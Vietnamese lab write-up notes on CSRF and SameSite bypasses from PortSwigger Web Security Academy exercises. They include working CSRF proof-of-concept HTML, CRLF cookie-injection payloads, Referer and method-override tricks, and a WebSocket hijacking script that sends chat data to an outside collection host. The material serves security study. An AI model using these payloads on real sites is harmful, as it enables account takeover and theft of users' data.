- Hoàn tất một luồng đăng nhập dựa trên **OAuth** có thể dẫn đến việc cấp một phiên mới mỗi lần, vì dịch vụ OAuth không nhất thiết biết người dùng có còn đăng nhập trên site mục tiêu hay không.

Để kích hoạt việc **làm mới cookie** mà không cần nạn nhân phải tự đăng nhập lại, bạn cần dùng **top-level navigation**, nhằm đảm bảo cookie gắn với phiên OAuth hiện tại của họ sẽ được gửi kèm. Điều này tạo thêm thách thức vì sau đó bạn phải **chuyển hướng người dùng quay lại site của mình** để có thể thực hiện tấn công CSRF.

Bạn cũng có thể kích hoạt việc làm mới cookie trong **một tab mới**, để trình duyệt không rời khỏi trang trước khi bạn kịp tung ra đòn tấn công cuối cùng. Tuy nhiên, cách này gặp một trở ngại nhỏ:

- Trình duyệt sẽ **chặn các popup tab** nếu chúng không được mở từ một thao tác thủ công của người dùng.

Ví dụ, đoạn lệnh sau sẽ mặc định bị chặn:

```jsx
window.open('<https://vulnerable-website.com/login/sso>');
```

Bạn có thể bao đoạn lệnh trên trong một **`onclick` event handler** như sau:

```jsx
window.onclick = () => {
    window.open('<https://vulnerable-website.com/login/sso>');
}
```

Theo cách này, phương thức `window.open()` chỉ được gọi khi người dùng nhấp chuột vào trang, giúp popup không bị trình duyệt chặn.

# Referer


Ngoài biện pháp sử dụng **CSRF token**, một số ứng dụng dựa vào header **HTTP Referer** để phòng chống CSRF, thường bằng cách xác minh rằng request bắt nguồn từ chính domain của ứng dụng. Tuy nhiên, cách tiếp cận này nhìn chung **kém hiệu quả** và thường có thể bị bypass.
## Header Referer

---

- **HTTP Referer header** là một header tùy chọn trong request, chứa **URL của trang web đã dẫn liên kết đến tài nguyên đang được yêu cầu**.
- Header này thường được trình duyệt tự động thêm vào khi người dùng kích hoạt một request HTTP, chẳng hạn như nhấp vào một liên kết hoặc gửi một form.
- Có nhiều cách cho phép trang liên kết **giữ lại hoặc thay đổi giá trị Referer header**, thường được sử dụng cho mục đích bảo mật thông tin cá nhân.

👉 Do giá trị **Referer** có thể bị thay đổi hoặc loại bỏ, các biện pháp phòng thủ CSRF dựa trên nó không đủ đáng tin cậy.
## Khai thác

### Tồn tại header


Một số ứng dụng xác thực header **Referer** khi nó có trong các yêu cầu nhưng bỏ qua việc xác thực nếu header này bị thiếu.

Trong tình huống này, kẻ tấn công có thể tạo khai thác CSRF theo cách khiến trình duyệt của người dùng nạn nhân loại bỏ header **Referer** trong yêu cầu được tạo ra. Có nhiều cách để đạt được điều này, nhưng cách dễ nhất là sử dụng thẻ **META** trong trang HTML chứa cuộc tấn công CSRF:

```html
<meta name="referrer" content="never">
```

### Xác thực Referer

Một số ứng dụng xác thực header **Referer** theo cách đơn giản, dễ bị bypass.

Ví dụ:

- Nếu ứng dụng chỉ kiểm tra rằng domain trong Referer **bắt đầu bằng** giá trị mong đợi, thì kẻ tấn công có thể đặt domain hợp lệ thành một **subdomain của domain do chúng kiểm soát**:

```
<http://vulnerable-website.com.attacker-website.com/csrf-attack>
```

- Nếu ứng dụng chỉ kiểm tra rằng Referer **có chứa** tên miền của chính nó, thì kẻ tấn công có thể nhúng giá trị này vào nơi khác trong URL:

```
<http://attacker-website.com/csrf-attack?vulnerable-website.com>
```

> **🔹 Lưu ý**
> 
> - Mặc dù bạn có thể phát hiện hành vi này khi dùng Burp, nhưng khi thử PoC trên trình duyệt, cách này thường **không còn hiệu quả**.
> - Nguyên nhân: nhiều trình duyệt hiện nay mặc định **loại bỏ query string khỏi Referer header** để giảm nguy cơ lộ dữ liệu nhạy cảm.
> - Bạn có thể **ghi đè hành vi này** bằng cách đảm bảo rằng phản hồi chứa payload khai thác có header sau:
> 
> ```
> Referrer-Policy: unsafe-url
> ```
> 
> (_Chú ý: ở đây từ **Referrer** được viết đúng chính tả, không giống như header HTTP `Referer`._)
> 
> Điều này đảm bảo toàn bộ URL, bao gồm cả query string, sẽ được gửi đi trong Referer header


# WU
## CSRF vul with no defense
- như đã trình bày:
Để một cuộc tấn công CSRF thành công, cần hội đủ 3 điều kiện:
1. **Một hành động nhạy cảm :** Chức năng thay đổi email của người dùng.
2. **Dựa trên Cookie:** Ứng dụng chỉ sử dụng Cookie để xác định người dùng nào đang thực hiện yêu cầu. Không có token hay cơ chế xác thực bổ sung nào khác.
3. **Tham số có thể dự đoán :** Các tham số trong request (như `email`) kẻ tấn công hoàn toàn có thể tự điền được.

- khi thay đổi email thấy trong reqeust ko hề có token hay csrf mà chỉ có cookie session

![](../../image/Pasted%20image%2020260505003502.png)
- chuột phải chọn engagement tools và generate PoC CSRF, sau đó copy html vào exploit server, gửi cho victom để solved bài lab (đổi email khác để ok bị trùng)

## CSRF where token validatoin depends on request method

- ở bài này, nhìn vào request change email thấy đã có thêm csrf token
![](../../image/Pasted%20image%2020260505004041.png)

Một số ứng dụng chỉ xác thực CSRF token đúng cách khi request sử dụng phương thức **POST**, nhưng lại bỏ qua việc xác thực khi sử dụng **GET**.

ta có thể **chuyển sang dùng phương thức GET** để bypass việc xác thực và thực hiện tấn công CSRF, ví dụ:

- sửa lại POST sang GET và thêm param email vào sau
![](../../image/Pasted%20image%2020260505004321.png)
- sau đó gene PoC CSRF và gửi cho nạn nhân để solved bài lab

## CSRF where token validation depends on token being present

Một số ứng dụng chỉ xác thực CSRF token khi nó **có mặt trong request**, nhưng lại **bỏ qua hoàn toàn việc xác thực** nếu tham số token bị thiếu.
Trong tình huống này, kẻ tấn công có thể **xóa toàn bộ tham số chứa token** (không chỉ xóa giá trị) để bypass xác thực và thực hiện tấn công CSRF

Vì ứng dụng không xử lý việc thiếu token, request vẫn được chấp nhận, cho phép kẻ tấn công thay đổi email và chiếm quyền kiểm soát tài khoản của nạn nhân.

=> như vậy chỉ cần xóa toàn bộ param token csrf trong request và gene PoC csrf để gửi cho nạn nhân
![](../../image/Pasted%20image%2020260505004640.png)

## CSRF where token is not tied to user session

- Một số ứng dụng không kiểm tra xem CSRF token có thuộc cùng phiên (**session**) với người dùng đang gửi request hay không. Thay vào đó, ứng dụng chỉ duy trì một **pool (tập hợp) token toàn cục** mà nó đã phát sinh và chấp nhận bất kỳ token nào có trong pool này.

Trong tình huống này:

- Kẻ tấn công có thể đăng nhập bằng **tài khoản của chính mình**,
- Lấy một **CSRF token hợp lệ**,
- Sau đó chèn token này vào request gửi cho nạn nhân trong cuộc tấn công CSRF.

Vì ứng dụng không ràng buộc token với phiên người dùng cụ thể, request độc hại vẫn được chấp nhận, dẫn đến việc kẻ tấn công có thể thực hiện hành động thay mặt nạn nhân.

login vào tài khoản của wiener:peter và đổi email
![](../../image/Pasted%20image%2020260505005341.png)

- login sang tài khoản của carlos:montoya, sau đó bật intercprt để chặn gói tin thay mật khẩu, 
![](../../image/Pasted%20image%2020260505005433.png)

- ta đã có csrf token của carlos, giờ copy nó sang gói tin của wiener vừa rồi và generate PoC CSRF, như đã nói ứng dụng chỉ duy trì một **pool (tập hợp) token toàn cục** mà nó đã phát sinh và chấp nhận bất kỳ token nào có trong pool này.


## CSRF where token is tied to non-session cookie
- lỗ hổng xảy ra khi ứng dụng có ràng buộc CSRF token với một **cookie**, nhưng cookie đó **không phải** là cookie được dùng để quản lý phiên (**session cookie**).

Điều này thường xảy ra khi ứng dụng sử dụng **hai framework khác nhau**:
- Một framework để xử lý phiên (session handling).
- Một framework khác để bảo vệ CSRF.
    → Và hai cơ chế này **không được tích hợp chặt chẽ** với nhau.

![](../../image/Pasted%20image%2020260505010147.png)token **csrf** chỉ được ràng buộc với cookie **csrfKey**, chứ không liên quan gì đến cookie **session**. Điều này cho phép kẻ tấn công thao túng token–cookie cặp đôi này để thực hiện CSRF attack mà không bị ràng buộc với phiên thực tế của nạn nhân.

Kịch bản khai thác:

1. Kẻ tấn công đăng nhập vào ứng dụng bằng tài khoản của chính mình.
2. Lấy một **token hợp lệ** cùng với **cookie đi kèm**.
3. Lợi dụng hành vi cho phép đặt cookie để chèn cookie của chúng vào trình duyệt của nạn nhân.
4. Gửi token của chúng cho nạn nhân trong một cuộc tấn công CSRF.

- khi thử lấy cặp coken csrf và csrfkey của carlos thay vào cho wiener thì request vẫn được chấp nhận
![](../../image/Pasted%20image%2020260505012525.png)

- ở chức năng search, server trả về chuỗi đã search trên header
![](../../image/Pasted%20image%2020260505012635.png)

- lợi dụng ký tự xuống dòng (`%0d%0a` - CRLF) để tiêm thêm một Header `Set-Cookie` mới:

1. ở request của wiener, generate PoC CSRF
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0abb00ff04bf087f8128700e00ff0007.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="Ml4fj5ueGvIHR0POQ0OJYCbUY0Sx85KA" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0abb00ff04bf087f8128700e00ff0007.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=rENkoA48d5go3GIT9GeDwE1XJVx7QXXF%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>


```

- xóa script mặc định và thay đoạn script:
```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```
 ta cần thay csrf value và csrf key vào 2 giá trị của wierner bằng cách login vào tài khoản của carlos (bằng tab ẩn danh để tránh trùng session)
 ![](../../image/Pasted%20image%2020260505014256.png)

sau khi hoàn tất, deliver to victom để tấn công

## CSRF where token is duplicated in cookie

khi ứng dụng **không lưu trữ token nào phía server**, mà chỉ **nhân bản token** trong cả cookie và tham số của request.

![](../../image/Pasted%20image%2020260505014533.png)

kẻ tấn công **vẫn có thể thực hiện CSRF attack** nếu website có bất kỳ chức năng nào cho phép **đặt cookie trong trình duyệt nạn nhân**.

- Kẻ tấn công **không cần token hợp lệ** của riêng mình.
- Chúng có thể tự tạo ra một token (chỉ cần theo đúng định dạng nếu ứng dụng có kiểm tra).
- Sau đó, lợi dụng hành vi đặt cookie để chèn cookie giả vào trình duyệt nạn nhân.
- Cuối cùng, gửi request chứa token tự chế khớp với cookie đã chèn, qua đó bypass được kiểm tra và thực hiện tấn công CSRF thành công.

- như bài lab trên thì chức năng search trả về giá trị trên cookie, ta inject cookies vào trình duyệt của nạn nhân

- **Thẻ `<img>`:** Cố gắng tải một ảnh từ URL tìm kiếm chứa mã CRLF (`%0d%0a`). Việc này khiến trình duyệt nhận Header `Set-Cookie` và ghi đè `csrfKey` của nạn nhân bằng `YOUR-KEY`.
- **Sự kiện `onerror`:** Vì URL trên không phải là ảnh thật, sự kiện `onerror` sẽ kích hoạt ngay sau khi Cookie đã được tiêm thành công, tự động submit Form bên trên.
![](../../image/Pasted%20image%2020260505014943.png)
- ta chỉ cần đổi csrf thành giá trị khác, trùng cả 2 và trùng với giá trị trong script
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa10046044f537680d444c3001b0028.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="fake" />
      <input type="submit" value="Submit request" />
    </form>
   <img src="https://0aa10046044f537680d444c3001b0028.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
    </script>
  </body>
</html>

```


## SameSite Strict bypass via client-side redirect

- ở requst post /login, ta thấy repsonse có samesite=strict ở Header set-cookie, với cấu hình này, trình duyệt sẽ **không bao giờ** gửi kèm Cookie `session` nếu request xuất phát từ một domain khác
![](../../image/Pasted%20image%2020260505020329.png)
- khi vào commnet ở 1 blog, nó sẽ chuyển sang page cảm ơn nhugnw bị quay trở lại blog sau vài giây
![](../../image/Pasted%20image%2020260505020718.png)

![](../../image/Pasted%20image%2020260505020701.png)

- ở resonse, có 1 đoạn mã js sử dụng postId để redirect
![](../../image/Pasted%20image%2020260505020948.png)


- khi gửi thử: /post/comment/confirmation?postId=foo
![](../../image/Pasted%20image%2020260505021156.png)

/post/comment/confirmation?postId=1/../../my-account
 thì web điều hướng về trang myaccount
 - **Server-side**: Server nhận tham số `postId` là chuỗi `1/../../my-account`. 
- **Client-side**: Đoạn mã JavaScript trên trang này lấy giá trị `postId` để xây dựng URL điều hướng.
- **URL được xây dựng**: `/post/1/../../my-account`.
- **Browser Normalization**: Trình duyệt sẽ hiểu chuỗi trên tương đương với `/my-account`. Vì request này được khởi tạo từ chính domain của Lab, trình duyệt sẽ đính kèm Cookie `session` có thuộc tính `SameSite=Strict`.

![](../../image/Pasted%20image%2020260505021811.png)
- khi đổi method từ post sang get thì server vẫn xử lí
=> ta có thể xây dựng payload

```
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>
```

## SameSite Lax bypass via cookie refresh

- Nhìn vào Response `/oauth-callback`).
- Server không khai báo thuộc tính SameSite khi `Set-Cookie`.
Trình duyệt sẽ mặc định áp dụng cơ chế **Lax**. Với `Lax`, request `POST` từ site khác (cross-site) sẽ bị chặn Cookie theo mặc định.
![](../../image/Pasted%20image%2020260505023537.png)

- tuy nhiên một Cookie được đặt mặc định là `Lax` vẫn sẽ được gửi kèm trong request `POST` cross-site nếu nó được thiết lập trong vòng **120 giây (2 phút)** trở lại. Đây là một "cửa sổ thời gian" hẹp để duy trì tính tương thích ngược cho các luồng đăng nhập.
- endpoint `/social-login` cho phép tự động thực hiện luồng OAuth và cấp lại một Cookie `session` mới mà không cần tương tác phức tạp từ người dùng
![](../../image/Pasted%20image%2020260505024440.png)
- nạn nhân click vào bất kỳ đâu trên trang web.
- **Làm mới Session:** Sự kiện `onclick` sẽ kích hoạt `window.open()` đến endpoint `/social-login`. Việc này giúp làm mới Cookie session của nạn nhân, kích hoạt lại "cửa sổ 2 phút" của cơ chế Lax.
- **Trì hoãn (Delay):** Sử dụng `setTimeout` (khoảng 5 giây) để đảm bảo luồng OAuth hoàn tất và trình duyệt đã nhận được Cookie mới.
- **Thực thi CSRF:** Tự động submit Form `POST` đổi email. Lúc này, do Cookie vừa được tạo < 2 phút, trình duyệt sẽ cho phép đính kèm Cookie session vào request POST cross-site.
```
<form method="POST" action="https://0a5100280311f6a480942b6b00ac00b5.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://0a5100280311f6a480942b6b00ac00b5.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

## SameSite Lax bypass via method override

- ở phần thay đổi mật khẩu ko thấy request chứa token csrf nào 
- ở login, ko thấy các thuộc tính samesite ở set-cookie được khai báo rõ ràng, trình duyệt sẽ tự động áp dụng chính sách là samesite=lax (Ở chế độ này, trình duyệt sẽ chặn việc gửi kèm Cookie session trong các request `POST` xuất phát từ site khác (cross-site).)
![](../../image/Pasted%20image%2020260505025031.png)

- đổi thử request POST sang GET, thì method not allow
- có thể ghi đè bằng cách thêm _method ở cuối
![](../../image/Pasted%20image%2020260505025436.png)
![](../../image/Pasted%20image%2020260505025607.png)
![](../../image/Pasted%20image%2020260505025614.png)
- bây giờ server đã xử lí, email đc cập nhật

=> tạo 1 script để exploit
```
<script>
    document.location = "https://0ac300b4034a30ef81e6cab200ba00ce.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

## CSRF where Referer validation depends on header being present
- Một số ứng dụng kiểm tra Header `Referer` để đảm bảo request gửi đến thực sự xuất phát từ chính trang web của họ.
- **Logic bảo mật:** "Nếu Header Referer chứa domain của tôi, tôi sẽ chấp nhận. Nếu không, tôi sẽ chặn."
nhưng Nếu Header Referer khớp với domain của tôi **HOẶC Header này không tồn tại**, tôi sẽ cho phép."
- ở reqeust update email, khi thay đổi referer header sang domain khác

![](../../image/Pasted%20image%2020260505030238.png)

- nhưng khi xóa header referer đi thì server lại chấp nhận
![](../../image/Pasted%20image%2020260505030348.png)


- chuột phải và generate csrd PoC
	- thêm : `<meta name="referrer" content="no-referrer">`: để Ép trình duyệt không gửi Header Referer để bypass bộ lọc của Server
```
<html>
	<head>
		<meta name="referrer" content="no-referrer">
	</head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a31008e04c3e5b0802f3ac600c100f3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

## CSRF with broken Referer validation
Thay vì kiểm tra Header `Referer` có khớp hoàn toàn với domain hợp lệ hay không, ứng dụng này chỉ kiểm tra xem **chuỗi domain hợp lệ có tồn tại ở đâu đó** trong Header `Referer` hay không.
![](../../image/Pasted%20image%2020260505030841.png)
- Kẻ tấn công có thể tạo ra một URL ở domain của mình nhưng chứa chuỗi domain của nạn nhân để đánh lừa bộ lọc.
`[https://exploit-server.net/YOUR-LAB-ID.web-security-academy.net](https://exploit-server.net/YOUR-LAB-ID.web-security-academy.net)`
- Lúc này, trình duyệt gửi request và Header `Referer` sẽ là URL trên. Bộ lọc thấy có sự xuất hiện của domain hợp lệ nên sẽ cho phép thực thi.

- generate PoC csrf
```
    <form action="https://0af500240338e0d8821356aa00a10092.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked12&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0af500240338e0d8821356aa00a10092.web-security-academy.net"); (Thay đổi URL trên trình duyệt để chứa domain Lab trong Query String)
      document.forms[0].submit();
    </script>

```
nếu ko thành công, nhớ thêm: Referrer-Policy: unsafe-url vào phần head
bởi vì mặc định, các trình duyệt hiện nay (đặc biệt là Chrome và Firefox) áp dụng chính sách `strict-origin-when-cross-origin`. Điều này có nghĩa là khi bạn thực hiện một request từ Site A sang Site B:
- Trình duyệt chỉ gửi **Origin** (ví dụ: `[https://exploit-server.net](https://exploit-server.net)`) trong Header `Referer`.
- Trình duyệt sẽ **tự động cắt bỏ** phần Path và Query String (như `/?YOUR-LAB-ID...`) để bảo vệ quyền riêng tư của người dùng.

## SameSite Strict bypass via sibling domain
- trang web có chức năng live chat
![](../../image/Pasted%20image%2020260505032535.png)
- thấy Request khởi tạo WebSocket không được đính kèm Cookie. Bạn chỉ nhận được lịch sử chat trống của một session mới, chứng minh `SameSite=Strict` đã chặn đứng cuộc tấn công trực tiếp.

- vì Khi không thể tấn công trực tiếp từ bên ngoài, ta cần tìm một vị trí "cùng nhà" (Same-site) để ra đòn

- dùng burp collabolration gửi nội dung đó về URL **Collaborator** của bạn dưới dạng một request POST
```
<script>
    var ws = new WebSocket('wss://0a34007a03ce41fe80dc127f002d0056.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://w96nisqat0nsz0p0gd9wbx643v9mxcl1.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![](../../image/Pasted%20image%2020260505033031.png)
![](../../image/Pasted%20image%2020260505033329.png)



```
<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>
```

![](../../image/Pasted%20image%2020260505035331.png)


![](../../image/Pasted%20image%2020260505035309.png)


![](../../image/Pasted%20image%2020260505035253.png)